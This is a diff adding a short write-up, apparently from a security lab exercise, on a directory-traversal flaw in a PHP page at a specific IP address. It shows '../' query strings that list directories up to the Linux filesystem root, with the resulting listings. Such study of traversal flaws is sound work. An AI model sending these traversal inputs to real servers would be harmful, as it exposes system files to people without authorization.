@@ -1,0 +1,71 @@
+step_d
+
+What you see is a status report of the error that is given.
+the error occurs when you use a query string that is not registered in the web server. This error not only indicates that this page is not indexed, but also gives a pretty broad overview of what the filestructure is from the root of the server, or in this case, the entire Linux OS that is running the server. This shows someone exactly what should be accessible to them from the outside
+
+if they use a query string, they can actually navigate inside of the OS.
+
+'http://143.198.43.57/directory_traversal_part1.php?q=../' will display
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => html
+)
+
+
+'http://143.198.43.57/directory_traversal_part1.php?q=../../' will display
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => .updated
+    [3] => backups
+    [4] => cache
+    [5] => crash
+    [6] => lib
+    [7] => local
+    [8] => lock
+    [9] => log
+    [10] => mail
+    [11] => opt
+    [12] => run
+    [13] => snap
+    [14] => spool
+    [15] => tmp
+    [16] => www
+)
+
+and lastly
+'http://143.198.43.57/directory_traversal_part1.php?q=../../../' will display
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => bin
+    [3] => bin.usr-is-merged
+    [4] => boot
+    [5] => dev
+    [6] => etc
+    [7] => home
+    [8] => lib
+    [9] => lib.usr-is-merged
+    [10] => lib64
+    [11] => lost+found
+    [12] => media
+    [13] => mnt
+    [14] => opt
+    [15] => proc
+    [16] => root
+    [17] => run
+    [18] => sbin
+    [19] => sbin.usr-is-merged
+    [20] => snap
+    [21] => srv
+    [22] => sys
+    [23] => tmp
+    [24] => usr
+    [25] => var
+)
+
+this is a complete overview of the system to navigate through.
